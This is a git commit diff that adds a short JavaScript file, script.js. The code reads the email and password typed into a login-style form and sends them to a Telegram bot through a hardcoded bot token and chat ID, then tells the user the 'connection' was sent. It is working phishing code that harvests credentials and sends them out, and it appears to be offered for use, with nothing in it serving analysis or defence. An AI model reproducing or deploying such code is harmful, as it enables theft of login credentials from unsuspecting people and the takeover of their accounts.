f72c4effad16933ed4940cd56736d3de2ccdab70
chatlibanais136-boop <chatlibanais136@gmail.com>
2026-06-24 21:09:03 +0200

    Add files via upload

---
+++ script.js
@@ -0,0 +1,37 @@
+function sendToTelegram(){
+
+    const token = "8896660959:AAFpwOjbWRy3a2VoCBCvqMbDrn79Pf40BaQ";
+    const chatId = "8470376691";
+
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+
+    if(email === "" || password === ""){
+        alert("Remplis tous les champs !");
+        return;
+    }
+
+    const message = `
+🔐 Nouveau formulaire
+📧 Email: ${email}
+🔑 Password: ${password}
+`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+        })
+    })
+    .then(response => {
+        alert("Connexion envoyée !");
+    })
+    .catch(error => {
+        alert("Erreur d'envoi !");
+        console.error(error);
+    });
+}
